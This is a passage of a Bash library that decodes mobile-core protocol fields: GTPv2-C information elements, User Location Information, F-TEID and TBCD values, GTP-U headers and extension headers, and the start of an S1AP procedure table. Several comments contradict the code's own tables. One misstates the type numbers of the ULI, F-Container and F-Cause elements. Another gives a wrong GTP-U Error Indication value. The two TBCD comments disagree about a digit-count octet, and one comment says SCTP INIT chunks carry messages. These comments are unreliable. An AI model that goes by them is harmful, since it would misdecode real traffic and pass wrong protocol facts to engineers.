            71) printf 'ie.%d.decoded\tAPN=%s\n' "$n" "$(lcore_apn_decode "$val")" ;;                # §8.6
            73) printf 'ie.%d.decoded\tEBI=%s\n' "$n" "$((16#${val:0:2}))" ;;                        # §8.8
            76) printf 'ie.%d.decoded\tMSISDN=%s\n' "$n" "$(lcore_tbcd_decode "$val")" ;;            # §8.11
            82) printf 'ie.%d.decoded\tRAT=%s\n' "$n" "$(lcore_rat_name "$((16#${val:0:2}))")" ;;     # §8.17
            86) printf 'ie.%d.decoded\tULI=%s\n' "$n" "$(lcore_uli_compact "$val")" ;;               # §8.21
            87) printf 'ie.%d.decoded\tF-TEID=%s\n' "$n" "$(lcore_fteid_decode "$val")" ;;           # §8.22
            83) printf 'ie.%d.decoded\tServingNetwork=%s\n' "$n" "$(lcore_plmn_from_octets "${val:0:6}")" ;;  # §8.18
            111) printf 'ie.%d.decoded\tP-TMSI=%s\n' "$n" "$val" ;;                                  # §8.41, 4 octets
            80)  printf 'ie.%d.decoded\tQoS=%s\n' "$n" "$(lcore_qos_decode "$val")" ;;               # §8.15
            138) printf 'ie.%d.decoded\tMBMS Duration=%s\n' "$n" "$(lcore_mbms_duration_decode "$val")" ;;  # §8.69
            139) printf 'ie.%d.decoded\tMBMS Service Area=%s\n' "$n" "$(lcore_mbms_area_decode "$val")" ;;  # §8.70
            140) printf 'ie.%d.decoded\tMBMS Session Identifier=0x%s\n' "$n" "$val" ;;                # §8.71, 1 octet
            141) printf 'ie.%d.decoded\tMBMS Flow Identifier=0x%s\n' "$n" "$val" ;;                   # §8.72, 2 octets
            142) printf 'ie.%d.decoded\tMBMS IP Multicast Distribution=%s\n' "$n" "$(lcore_mbms_mcdist_decode "$val")" ;;  # §8.73
            158) printf 'ie.%d.decoded\tTMGI=%s\n' "$n" "$(lcore_tmgi_decode "$val")" ;;             # §8.89
            171) printf 'ie.%d.decoded\tMBMS Flags=%s\n' "$n" "$(lcore_mbms_flags_decode "$val")" ;;  # §8.99
        esac
        off=$(( off + 4 + len ))
        # In pad mode GTP-C IEs are padded to a 4-octet boundary and the
        # padding is not counted in Length; in exact mode there is none.
        if [[ "$mode" == pad ]]; then
            while (( off % 4 != 0 )); do off=$(( off + 1 )); done
        fi
        n=$(( n + 1 ))
    done
    if (( off < total )); then
        printf 'ERROR\t%s octet(s) left over after the last IE, too few for a header\n' \
            "$(( total - off ))" >&2
        return 1
    fi
    printf 'ie_count\t%s\n' "$n"
    return 0
}

# IE Type — TS 29.274 Table 8.1-1.
lcore_gtpc_ie_name() {
    # IE Type — TS 29.274 Table 8.1-1, copied from the table's own rows.
    # The argument is a decimal IE type. Reserved ranges are read as
    # ranges, not folded into the neighbouring singleton.
    local t="${1:-0}"
    [[ "$t" =~ ^[0-9]+$ ]] || { echo "unknown/extension IE type"; return 0; }
    if (( t >= 4 && t <= 34 )); then echo "Reserved for the S101 interface (TS 29.276)"; return 0; fi
    if (( t >= 35 && t <= 50 )); then echo "Reserved for the S121 interface (TS 29.276)"; return 0; fi
    if (( t >= 52 && t <= 70 )); then echo "Reserved for the Sv interface (TS 29.280)"; return 0; fi
    if (( t >= 207 && t <= 253 )); then echo "Spare, for future use"; return 0; fi
    case "$t" in
        0)	echo "Reserved" ;;
        1)	echo "International Mobile Subscriber Identity (IMSI)" ;;
        2)	echo "Cause" ;;
        3)	echo "Recovery (Restart Counter)" ;;
        51)	echo "STN-SR" ;;
        71)	echo "Access Point Name (APN)" ;;
        72)	echo "Aggregate Maximum Bit Rate (AMBR)" ;;
        73)	echo "EPS Bearer ID (EBI)" ;;
        74)	echo "IP Address" ;;
        75)	echo "Mobile Equipment Identity (MEI)" ;;
        76)	echo "MSISDN" ;;
        77)	echo "Indication" ;;
        78)	echo "Protocol Configuration Options (PCO)" ;;
        79)	echo "PDN Address Allocation (PAA)" ;;
        80)	echo "Bearer Level Quality of Service (Bearer QoS)" ;;
        81)	echo "Flow Quality of Service (Flow QoS)" ;;
        82)	echo "RAT Type" ;;
        83)	echo "Serving Network" ;;
        84)	echo "EPS Bearer Level Traffic Flow Template (Bearer TFT)" ;;
        85)	echo "Traffic Aggregation Description (TAD)" ;;
        86)	echo "User Location Information (ULI)" ;;
        87)	echo "Fully Qualified Tunnel Endpoint Identifier (F-TEID)" ;;
        88)	echo "TMSI" ;;
        89)	echo "Global CN-Id" ;;
        90)	echo "S103 PDN Data Forwarding Info (S103PDF)" ;;
        91)	echo "S1-U Data Forwarding Info (S1UDF)" ;;
        92)	echo "Delay Value" ;;
        93)	echo "Bearer Context" ;;
        94)	echo "Charging ID" ;;
        95)	echo "Charging Characteristics" ;;
        96)	echo "Trace Information" ;;
        97)	echo "Bearer Flags" ;;
        98)	echo "Reserved" ;;
        99)	echo "PDN Type" ;;
        100)	echo "Procedure Transaction ID" ;;
        101)	echo "Reserved" ;;
        102)	echo "Reserved" ;;
        103)	echo "MM Context (GSM Key and Triplets)" ;;
        104)	echo "MM Context (UMTS Key, Used Cipher and Quintuplets)" ;;
        105)	echo "MM Context (GSM Key, Used Cipher and Quintuplets)" ;;
        106)	echo "MM Context (UMTS Key and Quintuplets)" ;;
        107)	echo "MM Context (EPS Security Context, Quadruplets and Quintuplets)" ;;
        108)	echo "MM Context (UMTS Key, Quadruplets and Quintuplets)" ;;
        109)	echo "PDN Connection" ;;
        110)	echo "PDU Numbers" ;;
        111)	echo "P-TMSI" ;;
        112)	echo "P-TMSI Signature" ;;
        113)	echo "Hop Counter" ;;
        114)	echo "UE Time Zone" ;;
        115)	echo "Trace Reference" ;;
        116)	echo "Complete Request Message" ;;
        117)	echo "GUTI" ;;
        118)	echo "F-Container" ;;
        119)	echo "F-Cause" ;;
        120)	echo "PLMN ID" ;;
        121)	echo "Target Identification" ;;
        122)	echo "Reserved" ;;
        123)	echo "Packet Flow ID" ;;
        124)	echo "RAB Context" ;;
        125)	echo "Source RNC PDCP Context Info" ;;
        126)	echo "Port Number" ;;
        127)	echo "APN Restriction" ;;
        128)	echo "Selection Mode" ;;
        129)	echo "Source Identification" ;;
        130)	echo "Reserved" ;;
        131)	echo "Change Reporting Action" ;;
        132)	echo "Fully Qualified PDN Connection Set Identifier (FQ-CSID)" ;;
        133)	echo "Channel needed" ;;
        134)	echo "eMLPP Priority" ;;
        135)	echo "Node Type" ;;
        136)	echo "Fully Qualified Domain Name (FQDN)" ;;
        137)	echo "Transaction Identifier (TI)" ;;
        138)	echo "MBMS Session Duration" ;;
        139)	echo "MBMS Service Area" ;;
        140)	echo "MBMS Session Identifier" ;;
        141)	echo "MBMS Flow Identifier" ;;
        142)	echo "MBMS IP Multicast Distribution" ;;
        143)	echo "MBMS Distribution Acknowledge" ;;
        144)	echo "RFSP Index" ;;
        145)	echo "User CSG Information (UCI)" ;;
        146)	echo "CSG Information Reporting Action" ;;
        147)	echo "CSG ID" ;;
        148)	echo "CSG Membership Indication (CMI)" ;;
        149)	echo "Service indicator" ;;
        150)	echo "Detach Type" ;;
        151)	echo "Local Distiguished Name (LDN)" ;;
        152)	echo "Node Features" ;;
        153)	echo "MBMS Time to Data Transfer" ;;
        154)	echo "Throttling" ;;
        155)	echo "Allocation/Retention Priority (ARP)" ;;
        156)	echo "EPC Timer" ;;
        157)	echo "Signalling Priority Indication" ;;
        158)	echo "Temporary Mobile Group Identity (TMGI)" ;;
        159)	echo "Additional MM context for SRVCC" ;;
        160)	echo "Additional flags for SRVCC" ;;
        161)	echo "Reserved" ;;
        162)	echo "MDT Configuration" ;;
        163)	echo "Additional Protocol Configuration Options (APCO)" ;;
        164)	echo "Absolute Time of MBMS Data Transfer" ;;
        165)	echo "H(e)NB Information Reporting" ;;
        166)	echo "IPv4 Configuration Parameters (IP4CP)" ;;
        167)	echo "Change to Report Flags" ;;
        168)	echo "Action Indication" ;;
        169)	echo "TWAN Identifier" ;;
        170)	echo "ULI Timestamp" ;;
        171)	echo "MBMS Flags" ;;
        172)	echo "RAN/NAS Cause" ;;
        173)	echo "CN Operator Selection Entity" ;;
        174)	echo "Trusted WLAN Mode Indication" ;;
        175)	echo "Node Number" ;;
        176)	echo "Node Identifier" ;;
        177)	echo "Presence Reporting Area Action" ;;
        178)	echo "Presence Reporting Area Information" ;;
        179)	echo "TWAN Identifier Timestamp" ;;
        180)	echo "Overload Control Information" ;;
        181)	echo "Load Control Information" ;;
        182)	echo "Metric" ;;
        183)	echo "Sequence Number" ;;
        184)	echo "APN and Relative Capacity" ;;
        185)	echo "WLAN Offloadability Indication" ;;
        186)	echo "Paging and Service Information" ;;
        187)	echo "Integer Number" ;;
        188)	echo "Millisecond Time Stamp" ;;
        189)	echo "Monitoring Event Information" ;;
        190)	echo "ECGI List" ;;
        191)	echo "Remote UE Context" ;;
        192)	echo "Remote User ID" ;;
        193)	echo "Remote UE IP information" ;;
        194)	echo "CIoT Optimizations Support Indication" ;;
        195)	echo "SCEF PDN Connection" ;;
        196)	echo "Header Compression Configuration" ;;
        197)	echo "Extended Protocol Configuration Options (ePCO)" ;;
        198)	echo "Serving PLMN Rate Control" ;;
        199)	echo "Counter" ;;
        200)	echo "Mapped UE Usage Type" ;;
        201)	echo "Secondary RAT Usage Data Report" ;;
        202)	echo "UP Function Selection Indication Flags" ;;
        203)	echo "Maximum Packet Loss Rate" ;;
        204)	echo "APN Rate Control Status" ;;
        205)	echo "Extended Trace Information" ;;
        206)	echo "Monitoring Event Extension Information" ;;
        254)	echo "Special IE type for IE Type Extension" ;;
        255)	echo "Private Extension" ;;
        *)   echo "unknown/extension IE type" ;;
    esac
}

# NOTE on the task brief: it lists IE 86 as ECGI and 87 as TAI, and also
# describes ULI as "86/87". On the wire those two numbers are F-Container
# (86) and F-Cause (87); ECGI and TAI are *fields inside* the ULI IE (114),
# which is where this decoder reads them. Both interpretations are exposed:
# the raw type table above, and the ULI sub-field decoder below.
lcore_lai_decode() {
    local v; v=$(lcore_nfc "${1:-}")
    [[ ${#v} -ge 10 ]] || return 1
    printf '%s lac=%d' "$(lcore_plmn_from_octets "${v:0:6}")" "$(( 16#${v:6:2} * 256 + 16#${v:8:2} ))"
}

lcore_cgi_decode() {
    # §8.21.2: PLMN, Location Area Code, then the 16-bit Cell Identity.
    local v; v=$(lcore_nfc "${1:-}")
    [[ ${#v} -ge 14 ]] || return 1
    printf '%s lac=%d ci=%d' "$(lcore_plmn_from_octets "${v:0:6}")" \
        "$(( 16#${v:6:2} * 256 + 16#${v:8:2} ))" \
        "$(( 16#${v:10:2} * 256 + 16#${v:12:2} ))"
}

lcore_sai_decode() {
    # §8.21.3: PLMN, LAC, then the 16-bit Service Area Code.
    local v; v=$(lcore_nfc "${1:-}")
    [[ ${#v} -ge 14 ]] || return 1
    printf '%s lac=%d sac=%d' "$(lcore_plmn_from_octets "${v:0:6}")" \
        "$(( 16#${v:6:2} * 256 + 16#${v:8:2} ))" \
        "$(( 16#${v:10:2} * 256 + 16#${v:12:2} ))"
}

lcore_rai_decode() {
    # §8.21.4: PLMN, LAC, then the 16-bit Routing Area Code.
    local v; v=$(lcore_nfc "${1:-}")
    [[ ${#v} -ge 14 ]] || return 1
    printf '%s lac=%d rac=%d' "$(lcore_plmn_from_octets "${v:0:6}")" \
        "$(( 16#${v:6:2} * 256 + 16#${v:8:2} ))" \
        "$(( 16#${v:10:2} * 256 + 16#${v:12:2} ))"
}

lcore_macro_enb_decode() {
    # §8.21.7: 20-bit Macro eNodeB ID starting at bit 4 of the fourth octet.
    local v; v=$(lcore_nfc "${1:-}")
    [[ ${#v} -ge 12 ]] || return 1
    local id=$(( 16#${v:6:6} & 0x0FFFFF ))
    printf '%s macro_enb=%d' "$(lcore_plmn_from_octets "${v:0:6}")" "$id"
}

lcore_extmacro_enb_decode() {
    # §8.21.8: 21 bits; the top bit is the SMeNB flag (bit 8 of octet 4),
    # so the identifier starts at bit 5 of that octet.
    local v; v=$(lcore_nfc "${1:-}")
    [[ ${#v} -ge 12 ]] || return 1
    local id=$(( 16#${v:6:6} & 0x1FFFFF ))
    printf '%s extmacro_enb=%d' "$(lcore_plmn_from_octets "${v:0:6}")" "$id"
}
lcore_uli_decode() {
    local val; val=$(lcore_nfc "${1:-}")
    [[ ${#val} -ge 2 ]] || return 1
    local flags=$(( 16#${val:0:2} ))
    local off=1 desc=""
    printf 'uli.flags\t%s\n' "$flags"
    # Bit 1 (0x01) CGI, bit 2 (0x02) SAI, bit 3 (0x04) RAI,
    # bit 4 (0x08) TAI, bit 5 (0x10) ECGI, bit 6 (0x20) LAI.
    (( flags & 0x01 )) && { desc+="CGI "; printf 'uli.cgi\t%s\n' "$(lcore_cgi_decode "${val:$((off*2)):14}")"; off=$((off+7)); }
    (( flags & 0x02 )) && { desc+="SAI "; printf 'uli.sai\t%s\n' "$(lcore_sai_decode "${val:$((off*2)):14}")"; off=$((off+7)); }
    (( flags & 0x04 )) && { desc+="RAI "; printf 'uli.rai\t%s\n' "$(lcore_rai_decode "${val:$((off*2)):14}")"; off=$((off+7)); }
    (( flags & 0x08 )) && { desc+="TAI "; printf 'uli.tai\t%s\n' "$(lcore_tai_decode "${val:$((off*2)):10}")"; off=$((off+5)); }
    (( flags & 0x10 )) && { desc+="ECGI "; printf 'uli.ecgi\t%s\n' "$(lcore_ecgi_decode "${val:$((off*2)):14}")"; off=$((off+7)); }
    (( flags & 0x20 )) && { desc+="LAI "; printf 'uli.lai\t%s\n' "$(lcore_lai_decode "${val:$((off*2)):10}")"; off=$((off+5)); }
    # Bits 7 and 8 are the Macro eNodeB ID and the Extended Macro eNodeB ID
    # (§8.21.7, §8.21.8). Both are 6 octets: PLMN, then 3 octets whose bit
    # 4 of the first is the top of a 20- or 21-bit identifier.
    (( flags & 0x40 )) && { desc+="MACRO "; printf 'uli.macro\t%s\n' "$(lcore_macro_enb_decode "${val:$((off*2)):12}")"; off=$((off+6)); }
    (( flags & 0x80 )) && { desc+="EXTMACRO "; printf 'uli.extmacro\t%s\n' "$(lcore_extmacro_enb_decode "${val:$((off*2)):12}")"; off=$((off+6)); }
    printf 'uli.present\t%s\n' "${desc:-none}"
    return 0
}

# TAI = MCC|MNC (3 octets, plain BCD) + TAC (2 octets), TS 29.274 §8.21.
lcore_tai_decode() {
    local v; v=$(lcore_nfc "${1:-}")
    [[ ${#v} -ge 10 ]] || return 1
    printf '%s tac=%d' "$(lcore_plmn_from_octets "${v:0:6}")" "$(( 16#${v:6:2} * 256 + 16#${v:8:2} ))"
}

# ECGI = MCC|MNC (3 octets) + ECI (4 octets, 28 bits used), TS 29.274 §8.21.
lcore_ecgi_decode() {
    local v; v=$(lcore_nfc "${1:-}")
    [[ ${#v} -ge 14 ]] || return 1
    printf '%s eci=%d' "$(lcore_plmn_from_octets "${v:0:6}")" \
        "$(( 16#${v:6:2} * 16777216 + 16#${v:8:2} * 65536 + 16#${v:10:2} * 256 + 16#${v:12:2} ))"
}

# APN is a sequence of labels, each length-prefixed (TS 23.003 §9.1).
lcore_apn_decode() {
    local v; v=$(lcore_nfc "${1:-}")
    [[ -n "$v" ]] || { printf ''; return 0; }
    local total=$(( ${#v} / 2 ))
    local off=0 out="" n
    while (( off < total )); do
        n=$(( 16#${v:$((off*2)):2} ))
        (( n == 0 )) && break
        (( off + 1 + n <= total )) || break
        local label="${v:$(((off+1)*2)):$((n*2))}"
        local txt; txt=$(lcore_hex_to_ascii "$label")
        out+="${out:+.}${txt}"
        off=$(( off + 1 + n ))
    done
    printf '%s' "$out"
}

lcore_hex_to_ascii() {
    local hex; hex=$(lcore_nfc "${1:-}")
    [[ -n "$hex" ]] || { printf ''; return 0; }
    (( ${#hex} % 2 == 0 )) || { printf '%s' "$hex"; return 0; }
    local out="" i
    for (( i = 0; i < ${#hex}; i += 2 )); do
        # Same trap as lcore_diameter_utf8: accumulate the escape text,
        # never let an inner printf consume the backslash.
        out+="\\x${hex:$i:2}"
    done
    printf '%b' "$out" | lcore_sanitize_stream
    return 0
}

# GTP-C IMSI IE: the identity is BCD with the *same* nibble rule as the
# air interface (TS 29.274 §8.3), including the 0xF filler for an odd
# digit count and the leading digit-count octet.
lcore_tbcd_decode() {
    local hex; hex=$(lcore_nfc "${1:-}")
    [[ -n "$hex" ]] || { printf ''; return; }
    (( ${#hex} % 2 == 0 )) || { printf 'ERROR\tTBCD value has an odd number of hex digits\n' >&2; return 1; }
    # TS 29.274 §8.3 (IMSI) and §8.11 (MSISDN): the value is plain TBCD.
    # Two digits per octet, the low nibble is the first digit; an odd
    # number of digits ends in the filler 1111 in the high nibble of the
    # last octet. There is no digit-count octet in front of the value.
    local out="" i f
    for (( i = 0; i < ${#hex}; i += 2 )); do
        f="${hex:$i:2}"
        out+="${f:1:1}${f:0:1}"
    done
    [[ "$out" =~ ^[0-9F]+$ ]] || { printf 'ERROR\tnot TBCD: value carries a nibble outside 0-9 and the filler F\n' >&2; return 1; }
    [[ "$out" == *F ]] && out="${out%F}"
    printf '%s' "$out"
}
lcore_rat_name() {
    # RAT Type values — TS 29.274 Table 8.17-1.
    case "${1:-}" in
        0)   echo "reserved" ;;
        1)   echo "UTRAN" ;;
        2)   echo "GERAN" ;;
        3)   echo "WLAN" ;;
        4)   echo "GAN" ;;
        5)   echo "HSPA Evolution" ;;
        6)   echo "EUTRAN (WB-E-UTRAN)" ;;
        7)   echo "Virtual" ;;
        8)   echo "EUTRAN-NB-IoT" ;;
        9)   echo "LTE-M" ;;
        10)  echo "NR" ;;
        *)   echo "spare" ;;
    esac
}

lcore_fteid_interface_name() {
    # F-TEID Interface Type — TS 29.274 §8.22, the 6-bit value in octet 5.
    case "${1:-}" in
        0)  echo "S1-U eNodeB GTP-U" ;;
        1)  echo "S1-U SGW GTP-U" ;;
        2)  echo "S12 RNC GTP-U" ;;
        3)  echo "S12 SGW GTP-U" ;;
        4)  echo "S5/S8 SGW GTP-U" ;;
        5)  echo "S5/S8 PGW GTP-U" ;;
        6)  echo "S5/S8 SGW GTP-C" ;;
        7)  echo "S5/S8 PGW GTP-C" ;;
        8)  echo "S5/S8 SGW PMIPv6" ;;
        9)  echo "S5/S8 PGW PMIPv6" ;;
        10) echo "S11 MME GTP-C" ;;
        11) echo "S11/S4 SGW GTP-C" ;;
        12) echo "S10/N26 MME GTP-C" ;;
        13) echo "S3 MME GTP-C" ;;
        14) echo "S3 SGSN GTP-C" ;;
        15) echo "S4 SGSN GTP-U" ;;
        16) echo "S4 SGW GTP-U" ;;
        17) echo "S4 SGSN GTP-C" ;;
        18) echo "S16 SGSN GTP-C" ;;
        19) echo "eNodeB GTP-U for DL data forwarding" ;;
        20) echo "eNodeB GTP-U for UL data forwarding" ;;
        21) echo "RNC GTP-U for data forwarding" ;;
        22) echo "SGSN GTP-U for data forwarding" ;;
        23) echo "SGW/UPF GTP-U for DL data forwarding" ;;
        24) echo "Sm MBMS GW GTP-C" ;;
        25) echo "Sn MBMS GW GTP-C" ;;
        26) echo "Sm MME GTP-C" ;;
        27) echo "Sn SGSN GTP-C" ;;
        28) echo "SGW GTP-U for UL data forwarding" ;;
        29) echo "Sn SGSN GTP-U" ;;
        30) echo "S2b ePDG GTP-C" ;;
        31) echo "S2b-U ePDG GTP-U" ;;
        32) echo "S2b PGW GTP-C" ;;
        33) echo "S2b-U PGW GTP-U" ;;
        34) echo "S2a TWAN GTP-U" ;;
        35) echo "S2a TWAN GTP-C" ;;
        36) echo "S2a PGW GTP-C" ;;
        37) echo "S2a PGW GTP-U" ;;
        38) echo "S11 MME GTP-U" ;;
        39) echo "S11 SGW GTP-U" ;;
        40) echo "N26 AMF GTP-C" ;;
        *)  echo "spare, reserved for future use" ;;
    esac
}

lcore_fteid_decode() {
    # TS 29.274 §8.22: octet 5 = V4(bit 8) V6(bit 7) Interface Type(6 bits),
    # octets 6-9 = TEID, then the IPv4 address if V4, then the IPv6 address
    # if V6. At least one of V4 and V6 shall be set.
    local val; val=$(lcore_nfc "${1:-}")
    [[ ${#val} -ge 2 ]] || return 1
    local o=$(( 16#${val:0:2} ))
    local v4=$(( (o >> 7) & 1 ))
    local v6=$(( (o >> 6) & 1 ))
    local itype=$(( o & 0x3F ))
    local out="" off=1
    out+="interface=$(lcore_fteid_interface_name "$itype") ($itype)"
    if (( ${#val} >= (off + 4) * 2 )); then
        out+=" teid=$(( 16#${val:$((off*2)):8 }))"
        off=$(( off + 4 ))
    else
        out+=" teid=none"
    fi
    if (( v4 == 1 )); then
        if (( ${#val} >= (off + 4) * 2 )); then
            out+=" ipv4=$(( 16#${val:$((off*2)):2 })).$(( 16#${val:$((off*2+2)):2 })).$(( 16#${val:$((off*2+4)):2 })).$(( 16#${val:$((off*2+6)):2 }))"
            off=$(( off + 4 ))
        else
            out+=" ipv4=truncated"
        fi
    fi
    if (( v6 == 1 )); then
        if (( ${#val} >= (off + 16) * 2 )); then
            out+=" ipv6=${val:$((off*2)):32}"
        else
            out+=" ipv6=truncated"
        fi
    fi
    (( v4 == 1 || v6 == 1 )) || out+=" note=neither V4 nor V6 set, which §8.22 forbids"
    printf '%s' "$out"
}

lcore_uli_compact() {
    # One line for the parse_ies renderer: the identities inside a ULI.
    lcore_uli_decode "${1:-}" | awk -F'\t' '$1 ~ /^uli\.(cgi|sai|rai|tai|ecgi|lai|macro|extmacro)$/ {k=$1; sub(/^uli\./,"",k); printf "%s %s; ", toupper(k), $2}'
}

# ── GTP-U — TS 29.281 §5.1 ──────────────────────────────────────────────
#
#   octet 0      : Flags (bit 8 = Version 1, bit 6 = PT, bit 5 = spare,
#                  bit 4 = E (extension header present), bit 3 = S (sequence),
#                  bit 2 = PN (N-PDU number))
#   octet 1      : Message Type (0xFF = G-PDU, 0x01 = Echo Request,
#                  0x02 = Echo Response, 0xFE = Error Indication,
#                  0x1F = Supported Extension Headers Notification)
#   octets 2..3  : Length (octets after the mandatory 8-octet header)
#   octets 4..7  : TEID
#   octets 8..9  : Sequence Number    ) present only when S=1
#   octet  10    : N-PDU Number       ) present only when PN=1
#   octet  11    : Next Extension Header Type ) present only when E=1
lcore_gtpu_parse_header() {
    local hex; hex=$(lcore_nfc "${1:-}")
    lcore_is_hex "$hex" || { printf 'ERROR\tnot valid hex\n' >&2; return 1; }
    (( ${#hex} >= 8 )) || { printf 'ERROR\tGTP-U shorter than the 8-octet mandatory header\n' >&2; return 1; }

    local flags="${hex:0:2}"
    local fv=$(( 16#$flags ))
    local ver=$(( (fv >> 5) & 0x07 ))
    local pt=$((  (fv >> 4) & 0x01 ))
    local ebit=$(( (fv >> 2) & 0x01 ))
    local sbit=$(( (fv >> 1) & 0x01 ))
    local pnbit=$(( fv & 0x01 ))
    local mtype="${hex:2:2}"
    local len=$(( 16#${hex:4:2} * 256 + 16#${hex:6:2} ))
    local teid=$(( 16#${hex:8:2} * 16777216 + 16#${hex:10:2} * 65536 + 16#${hex:12:2} * 256 + 16#${hex:14:2} ))
    local total=$(( ${#hex} / 2 ))
    (( ver == 1 )) || { printf 'ERROR\tGTP-U header says version %d; TS 29.281 §5.1 fixes the version at 1\n' "$ver" >&2; return 1; }

    printf 'version\t%s\n' "$ver"
    printf 'protocol\t%s\n' "$([[ $ver -eq 1 ]] && echo 'GTPv1-U' || echo "GTPv$ver")"
    printf 'flags\t%s\n' "$flags"
    printf 'flag_PT\t%s\n' "$pt"
    printf 'flag_E\t%s\n' "$ebit"
    printf 'flag_S\t%s\n' "$sbit"
    printf 'flag_PN\t%s\n' "$pnbit"
    printf 'spare_bits\t%s\n' "$(( fv & 0x08 ))"
    printf 'message_type\t0x%s\n' "$mtype"
    printf 'message_name\t%s\n' "$(lcore_gtpu_msg_name "$((16#$mtype))")"
    printf 'length\t%s\n' "$len"
    # §5.1: Length counts the octets after the 8-octet mandatory header,
    # sequence number, N-PDU number and extension headers included.
    printf 'length_agrees\t%s\n' "$([[ $len -eq $(( total - 8 )) ]] && echo yes || echo no)"
    (( len == total - 8 )) || printf 'note\tlength field says %d octets after the mandatory header, the frame carries %d\n' "$len" "$(( total - 8 ))"
    case "$((16#$mtype))" in
        1|2|26|31)
            # §5.1: the S flag shall be set for these four messages.
            (( sbit == 1 )) || printf 'note\tTS 29.281 §5.1 requires the S flag on message type %d, and this header clears it\n' "$((16#$mtype))" ;;
        254)
            (( sbit == 0 )) || printf 'note\tTS 29.281 §5.1 requires the S flag to be clear on an End Marker\n' ;;
    esac
    printf 'teid\t%s\n' "$teid"
    printf 'teid_hex\t%s\n' "${hex:8:8}"

    local off=8
    if (( sbit == 1 || pnbit == 1 || ebit == 1 )); then
        (( ${#hex} >= 12 * 2 )) || { printf 'ERROR\toptional flags set but the 4-octet trailer is missing\n' >&2; return 1; }
        local b=16
        if (( sbit == 1 )); then
            printf 'sequence_number\t%s\n' "$(( 16#${hex:$b:2} * 256 + 16#${hex:$((b+2)):2} ))"
        else
            printf 'sequence_number\tnone\n'
        fi
        if (( pnbit == 1 )); then
            printf 'npdu_number\t%s\n' "$((16#${hex:$((b+4)):2}))"
        else
            printf 'npdu_number\tnone\n'
        fi
        if (( ebit == 1 )); then
            printf 'next_extension_header_type\t0x%s\n' "${hex:$((b+6)):2}"
            printf 'next_extension_header_name\t%s\n' "$(lcore_gtpu_ext_name "$((16#${hex:$((b+6)):2}))")"
        else
            printf 'next_extension_header_type\tnone\n'
        fi
        off=12
    else
        printf 'sequence_number\tnone\n'
        printf 'npdu_number\tnone\n'
        printf 'next_extension_header_type\tnone\n'
    fi

    # Extension header chain: each header is
    #   octet 0     : length in 4-octet units (0 means 1 unit)
    #   octet 1     : content
    #   octet 2     : next extension header type
    # The chain ends when the next-type octet is 0x00.
    if (( ebit == 1 )); then
        local eoff=$off n=0
        # The chain starts at the type named by the trailer's
        # next-extension-header octet, which is octet 11 (hex offset 22).
        # It is NOT at a fixed position further into the packet.
        local nextt=$(( 16#${hex:22:2} ))
        while (( nextt != 0 )) && (( (eoff + 2) * 2 <= ${#hex} )); do
            local b=$(( eoff * 2 ))
            local units=$(( 16#${hex:$b:2} ))
            (( units == 0 )) && units=1
            local ehlen=$(( units * 4 ))
            printf 'ext.%d.type\t0x%02X\n' "$n" "$nextt"
            printf 'ext.%d.name\t%s\n' "$n" "$(lcore_gtpu_ext_name "$nextt")"
            printf 'ext.%d.comprehension\t%s\n' "$n" "$(lcore_gtpu_ext_comprehension "$(( (nextt >> 6) & 0x03 ))")"
            printf 'ext.%d.units\t%s\n' "$n" "$units"
            printf 'ext.%d.octets\t%s\n' "$n" "$ehlen"
            (( 16#${hex:$b:2} == 0 )) && printf 'ext.%d.note\tlength field is 0; TS 29.281 §5.2.1 requires a positive integer, so 0 is read as one 4-octet unit\n' "$n"
            (( (eoff + ehlen) * 2 <= ${#hex} )) || { printf 'ext.%d.note\ttruncated at the end of the packet\n' "$n"; break; }
            printf 'ext.%d.content\t%s\n' "$n" "${hex:$((b+2)):$((ehlen*2-2))}"
            # Next-type octet is the last octet of this extension header.
            nextt=$(( 16#${hex:$(((eoff + ehlen - 1) * 2)):2} ))
            eoff=$(( eoff + ehlen ))
            n=$(( n + 1 ))
            (( n > 16 )) && break
        done
        printf 'ext_count\t%s\n' "$n"
        printf 'payload\t%s\n' "${hex:$((eoff*2))}"
    else
        printf 'ext_count\t0\n'
        printf 'payload\t%s\n' "${hex:$((off*2))}"
    fi
    return 0
}

lcore_gtpu_msg_name() {
    # GTP-U message types. TS 29.281 §4.4 defines the messages a user-plane
    # entity exchanges and leaves the numbers to TS 29.060 Table 6.1-1,
    # which the two protocols share; the End Marker is 254, not 255.
    case "${1:-}" in
        1)   echo "Echo Request" ;;
        2)   echo "Echo Response" ;;
        3)   echo "Version Not Supported Indication" ;;
        26)  echo "Error Indication" ;;
        31)  echo "Supported Extension Headers Notification" ;;
        254) echo "End Marker" ;;
        255) echo "G-PDU (T-PDU)" ;;
        *)   echo "unknown" ;;
    esac
}

# Extension Header Type — TS 29.281 Table 5.1-1.
lcore_gtpu_ext_name() {
    # Extension Header Type — TS 29.281 Table 5.2.1-2 (Figure 5.2.1-3).
    # The wire values are 0x00..0x03, 0x20, 0x40, 0x81..0x85, 0xC0..0xC2.
    # The argument is a DECIMAL integer: `case` matches patterns as text, so
    # a `0x40)` pattern would never match the number 64.
    case "${1:-}" in
        0)   echo "No more extension headers" ;;
        1)   echo "Reserved - Control Plane only" ;;
        2)   echo "Reserved - Control Plane only" ;;
        3)   echo "Long PDCP PDU Number" ;;
        32)  echo "Service Class Indicator" ;;
        64)  echo "UDP Port" ;;
        129) echo "RAN Container" ;;
        130) echo "Long PDCP PDU Number (earlier release; not sent by a source complying with this release)" ;;
        131) echo "Xw RAN Container" ;;
        132) echo "NR RAN Container" ;;
        133) echo "PDU Session Container" ;;
        192) echo "PDCP PDU Number" ;;
        193) echo "Reserved - Control Plane only" ;;
        194) echo "Reserved - Control Plane only" ;;
        *)   echo "unknown extension header" ;;
    esac
}

lcore_gtpu_ext_comprehension() {
    # TS 29.281 Figure 5.2.1-2: bits 8 and 7 of the Next Extension Header
    # Type say how a node that does not know the type must treat it.
    case "${1:-}" in
        0) echo "not required: an intermediate node forwards it" ;;
        1) echo "not required: an intermediate node discards the content" ;;
        2) echo "required by the endpoint receiver, not by an intermediate node" ;;
        3) echo "required by every recipient" ;;
        *) echo "unknown" ;;
    esac
}

# ── S1-MME / S1AP overview — TS 36.413 ──────────────────────────────────
# S1AP runs over SCTP on port 36412 (S1-MME). The SCTP association carries
# initiating messages in the INIT chunk and an arbitrary number of DATA
# chunks afterwards, each holding one S1AP PDU — either an
# InitiatingMessage, a SuccessfulOutcome or an UnsuccessfulOutcome,
# discriminated by the procedureCode and the trigger.
lcore_s1ap_procedures() {
    cat <<'EOF'
procedure	code	initiating	carries_identity
HandoverPreparation	0	HandoverRequired	no
HandoverResourceAllocation	1	HandoverRequest	no
HandoverNotification	2	HandoverNotify	no
